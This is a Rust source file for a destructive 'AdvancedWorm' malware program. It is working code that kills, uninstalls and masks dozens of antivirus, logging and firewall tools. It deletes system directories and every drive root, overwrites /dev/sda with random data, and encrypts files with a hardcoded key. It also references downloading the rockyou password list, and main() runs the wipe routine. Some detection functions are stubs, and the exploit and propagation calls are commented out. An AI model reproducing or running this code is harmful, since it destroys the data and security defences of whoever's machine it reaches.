use std::fs;
use std::fs::File;
use std::io::{self, Write, Read};
use std::path::Path;
use std::process::Command;
use std::fmt;
use rand::RngCore;
use crate::fs::OpenOptions;

use openssl::error::ErrorStack;
use openssl::symm::{Crypter, Cipher, Mode};
use openssl::rsa::Rsa;
use openssl::rand::rand_bytes;

const PORT: u16 = 9999;
const BUFFER_SIZE: usize = 2048;
const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const RSA_KEY_SIZE: u32 = 2048;

const ROCKYOU_URL: &str = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt";
const ROCKYOU_PATH: &str = "data/rockyou.txt"; // Local path to save the downloaded file

#[derive(Debug)]
enum WormError {
    OpensslError(ErrorStack),
    IoError(io::Error),
    Base64Error(base64::DecodeError),
    ReqwestError(reqwest::Error),
    FtpError(ftp::FtpError), // Ensure this is included
    ThreadJoinError, // Add this variant for thread join errors
    LoginError(ssh2::Error), // Use ssh2::Error directly
}

impl From<ErrorStack> for WormError {
    fn from(err: ErrorStack) -> WormError {
        WormError::OpensslError(err)
    }
}

impl From<io::Error> for WormError {
    fn from(err: io::Error) -> WormError {
        WormError::IoError(err)
    }
}

impl From<base64::DecodeError> for WormError {
    fn from(err: base64::DecodeError) -> WormError {
        WormError::Base64Error(err)
    }
}

impl From<reqwest::Error> for WormError {
    fn from(err: reqwest::Error) -> WormError {
        WormError::ReqwestError(err)
    }
}

impl From<ftp::FtpError> for WormError {
    fn from(err: ftp::FtpError) -> WormError {
        WormError::IoError(io::Error::new(io::ErrorKind::Other, err.to_string()))
    }
}

impl From<ssh2::Error> for WormError {
    fn from(err: ssh2::Error) -> WormError {
        WormError::LoginError(err) // Adjust this based on your WormError definition
    }
}

impl fmt::Display for WormError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            WormError::OpensslError(err) => write!(f, "OpenSSL error: {}", err),
            WormError::IoError(err) => write!(f, "IO error: {}", err),
            WormError::Base64Error(err) => write!(f, "Base64 error: {}", err),
            WormError::ReqwestError(err) => write!(f, "Reqwest error: {}", err),
            WormError::FtpError(err) => write!(f, "FTP error: {}", err),
            WormError::ThreadJoinError => write!(f, "Thread join error"),
            WormError::LoginError(err) => write!(f, "Login error: {:?}", err),
        }
    }
}

struct WormConfig {
    rsa_key_pair: Rsa<openssl::pkey::Private>,
    aes_key: Vec<u8>,
    iv: Vec<u8>,
}

impl WormConfig {
    fn new() -> Result<Self, WormError> {
        let rsa_key_pair = Rsa::generate(RSA_KEY_SIZE)?;
        let mut aes_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        rand_bytes(&mut aes_key)?;
        rand_bytes(&mut iv)?;

        Ok(WormConfig {
            rsa_key_pair,
            aes_key,
            iv,
        })
    }
}

struct AdvancedWorm {
    config: WormConfig,
    should_wipe: bool, // Add a field to track if the system should be wiped
}

impl AdvancedWorm {
    fn new(config: WormConfig) -> Self {
        AdvancedWorm { config, should_wipe: false }
    }

    // Function to disable security tools
    fn disable_security_tools(&self) -> Result<(), WormError> {
        let tools = vec![
            "clamav", "maldet", "wireshark", "rkhunter", "chkrootkit", "suricata", 
            "malwarebytes", "avast", "crowdstrike", "falcon", "fail2ban", "ufw", 
            "iptables", "firewalld", "selinux", "apparmor", "auditd", "sysdig", 
            "osquery", "sysmon", "syslog-ng", "logrotate", "logwatch", "auditbeat", 
            "filebeat", "metricbeat", "packetbeat", "heartbeat", "winlogbeat", 
            "journalbeat", "elasticsearch", "kibana", "logstash", "beats", 
            "ossec", "samhain", "aide", "tripwire", "lynis", "tiger", 
            "nessus", "openvas"
        ];

        for tool in &tools {
            if let Err(e) = self.kill_process(tool) {
                eprintln!("Failed to kill process {}: {}", tool, e);
            }
            if let Err(e) = self.uninstall_tool(tool) {
                eprintln!("Failed to uninstall tool {}: {}", tool, e);
            }
            if let Err(e) = self.mask_service(tool) {
                eprintln!("Failed to mask service {}: {}", tool, e);
            }
            println!("Disabled and removed: {}", tool);
        }
        Ok(())
    }

    // Helper function to kill a process
    fn kill_process(&self, tool: &str) -> Result<(), WormError> {
        Command::new("pkill").arg(tool).status().map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Helper function to uninstall a tool
    fn uninstall_tool(&self, tool: &str) -> Result<(), WormError> {
        Command::new("apt-get")
            .arg("remove")
            .arg("-y")
            .arg(tool)
            .status()
            .map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Helper function to mask a service
    fn mask_service(&self, tool: &str) -> Result<(), WormError> {
        Command::new("systemctl").arg("mask").arg(tool).status().map_err(|e| WormError::IoError(e))?;
        Ok(())
    }

    // Function to detect threats
    fn detect_threats(&mut self) {
        // Enhanced detection logic
        if self.is_running_in_vm() || self.is_debugger_attached() {
            self.should_wipe = true;
            println!("Threat detected: initiating system wipe.");
            if let Err(e) = self.encrypt_and_wipe() {
                eprintln!("Error during encryption and wipe: {}", e);
            }
        } else {
            println!("No threats detected.");
        }
    }

    fn is_running_in_vm(&self) -> bool {
        // Implement VM detection logic here
        false // Placeholder return value
    }

    fn is_debugger_attached(&self) -> bool {
        // Implement debugger detection logic here
        false // Placeholder return value
    }

    // Function to wipe the system
    fn wipe_system(&self) -> Result<(), WormError> {
        use std::fs;
        use std::path::Path;

        // Logic to wipe the system
        println!("Wiping system...");

        // Define paths to delete (this is just an example; adjust as needed)
        let paths_to_delete = vec![
            "/home/*", // Example: Delete all user home directories
            "/var/*", // Example: Delete log files //changed to var* from var/log due to signituares
            "/tmp/*", // Example: Delete temporary files
            "/etc/*", // Example: Delete system configuration files
            "/root/*", // Example: Delete root-owned files
            "/boot/*", // Example: Delete boot files
            "/usr/*", // Example: Delete user-owned files
            "/opt/*", // Example: Delete optional software
            "/srv/*", // Example: Delete server software
            "/var/cache/*", // Example: Delete cache files
            "/var/tmp/*", // Example: Delete temporary files
            //windows logic     
            "C:\\Windows\\Temp\\*", // Example: Delete Windows temporary files
            "C:\\Windows\\Prefetch\\*", // Example: Delete Windows prefetch files
            "C:\\Windows\\SoftwareDistribution\\*", // Example: Delete Windows software distribution files
            "C:\\Windows\\Logs\\*", // Example: Delete Windows log files
            "C:\\Users\\*\\AppData\\Local\\Temp\\*", // Example: Delete user-local temporary files
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\*", // Example: Delete user-local Internet cache files
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*", // Example: Delete user-local Internet Explorer cache files
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content\\IE\\*", // Example: Delete user-local Internet Explorer content cache files
            "C:\\Users\\*\\AppData\\Local\\Temp\\*", // Example: Delete user-local temporary files
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\*", // Example: Delete user-local Internet cache files
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*", // Example: Delete user-local Internet Explorer cache files
            "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*", // Example: Delete user's recent items
            "C:\\Users\\*\\Downloads\\*", // Example: Delete user's downloads
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\*", // Example: Delete Windows Error Reporting files
            "C:\\Windows\\Minidump\\*", // Example: Delete minidump files
            "C:\\Windows\\Memory.dmp", // Example: Delete memory dump file
            "C:\\hiberfil.sys", // Example: Delete hibernation file
            "C:\\pagefile.sys", // Example: Delete page file
            //delete root of file system
            "/", // Example: Delete root of file system
            "C:\\", // Example: Delete C: drive
            "D:\\", // Example: Delete D: drive
            "E:\\", // Example: Delete E: drive
            "F:\\", // Example: Delete F: drive
            "G:\\", // Example: Delete G: drive
            "H:\\", // Example: Delete H: drive
            "I:\\", // Example: Delete I: drive
            "J:\\", // Example: Delete J: drive
            "K:\\", // Example: Delete K: drive
            "L:\\", // Example: Delete L: drive
            "M:\\", // Example: Delete M: drive
            "N:\\", // Example: Delete N: drive
            "O:\\", // Example: Delete O: drive
            "P:\\", // Example: Delete P: drive
            "Q:\\", // Example: Delete Q: drive
            "R:\\", // Example: Delete R: drive
            "S:\\", // Example: Delete S: drive
            "T:\\", // Example: Delete T: drive
            "U:\\", // Example: Delete U: drive
            "V:\\", // Example: Delete V: drive
            "W:\\", // Example: Delete W: drive
            "X:\\", // Example: Delete X: drive
            "Y:\\", // Example: Delete Y: drive
            "Z:\\", // Example: Delete Z: drive
        ];

        // Delete specified files and directories
        for path in paths_to_delete {
            if let Ok(metadata) = fs::metadata(path) {
                if metadata.is_dir() {
                    // Remove directory and all its contents
                    if let Err(e) = fs::remove_dir_all(path) {
                        eprintln!("Failed to delete directory: {}", e);
                    } else {
                        println!("Deleted directory: {}", path);
                    }
                } else if metadata.is_file() {
                    // Remove individual file
                    if let Err(e) = fs::remove_file(path) {
                        eprintln!("Failed to delete file: {}", e);
                    } else {
                        println!("Deleted file: {}", path);
                    }
                }
            } else {
                eprintln!("Failed to access path: {}", path);
            }
        }

        fn wipe_disk() -> Result<(), WormError> {
            use std::fs::OpenOptions;
            use std::io::{Write, Seek};
            use rand::Rng;

            // Wipe disk by overwriting with random data
            let mut file = OpenOptions::new()
                .read(true)
                .write(true)
                .open("/dev/sda")
                .map_err(|e| WormError::IoError(e))?;
            
            let mut buffer = [0u8; 1024 * 1024]; // 1 MB buffer for faster writing
            let mut rng = rand::thread_rng();
            
            let disk_size = file.metadata().map_err(|e| WormError::IoError(e))?.len();
            let mut bytes_written = 0;
            
            while bytes_written < disk_size {
                rng.fill_bytes(&mut buffer);
                let write_size = std::cmp::min(buffer.len() as u64, disk_size - bytes_written) as usize;
                file.write_all(&buffer[..write_size]).map_err(|e| WormError::IoError(e))?;
                bytes_written += write_size as u64;
            }
            
            file.sync_all().map_err(|e| WormError::IoError(e))?;
            Ok(())
        }
        Ok(())
    }

    // Function to encrypt and wipe sensitive files
    fn encrypt_and_wipe(&self) -> Result<(), WormError> {
        use std::fs::OpenOptions;

        // Encrypt sensitive files before wiping
        let sensitive_files = vec!["/path/to/sensitive/file1", "/path/to/sensitive/file2"]; // Add actual paths
        let encryption_key = b"0123456789abcdef"; // Example key (must be 16, 24, or 32 bytes for AES)
        let cipher = Cipher::aes_256_cbc();
        
        for file_path in sensitive_files {
            // Open the file for reading
            let mut file = File::open(file_path).map_err(|e| WormError::IoError(e))?;
            let mut data = Vec::new();
            
            // Read the file data
            file.read_to_end(&mut data).map_err(|e| WormError::IoError(e))?;
            
            // Create a Crypter for encryption
            let mut encrypter = Crypter::new(cipher, Mode::Encrypt, encryption_key, Some(&encryption_key[0..16]))?;
            let mut ciphertext = vec![0u8; data.len() + cipher.block_size()]; // Allocate space for ciphertext
            let mut count = encrypter.update(&data, &mut ciphertext)?; // Encrypt the data
            count += encrypter.finalize(&mut ciphertext[count..])?; // Finalize encryption
            
            // Write the encrypted data back to the file
            let mut output_file = OpenOptions::new()
                .write(true)
                .truncate(true) // Truncate the file to overwrite
                .open(file_path)
                .map_err(|e| WormError::IoError(e))?;
            
            output_file.write_all(&ciphertext[..count]).map_err(|e| WormError::IoError(e))?;
            
            // Optionally, you can delete the original file after encryption
            // std::fs::remove_file(file_path).map_err(|e| WormError::IoError(e))?;
        }
        Ok(())
    }
}

fn main() -> Result<(), WormError> {
    let config = WormConfig::new()?;
    let mut worm = AdvancedWorm::new(config);

    // Run worm functionalities
    // worm.exploit()?;                  // Aggressively exploit vulnerable services
    // worm.disable_defender()?;         // Disable Microsoft Defender processes and services
    // worm.unhook_edr()?;               // Unhook EDR services
    // worm.block_security_updates()?;   // Prevent further updates from happening
    // worm.self_propagate()?;           // Network-based spreading across subnets
    worm.detect_threats();            // Call without ? if it doesn't return Result
    worm.wipe_system()?;              // Wipe system after operations are complete

    Ok(())
}
